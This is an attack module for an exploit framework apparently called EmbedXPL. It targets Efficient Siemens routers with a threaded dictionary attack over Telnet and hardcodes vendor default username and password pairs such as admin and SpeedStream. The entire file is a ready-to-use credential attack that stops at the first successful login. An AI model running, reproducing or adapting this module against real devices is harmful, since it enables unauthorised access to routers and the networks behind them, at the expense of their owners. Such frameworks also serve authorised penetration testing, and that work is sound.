# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.telnet_default import Exploit as TelnetDefault


class Exploit(TelnetDefault):
    __info__ = {
        "name": "Efficient Siemens Router Default Telnet Creds",
        "description": "Dictionary attack with default credentials against Efficient Siemens Router Telnet service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Efficient Siemens Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(23, "Target Telnet port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("NOLOGIN:NOLOGIN,NOLOGIN:SpeedStream,NOLOGIN:admin,admin:NOLOGIN,admin:SpeedStream", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
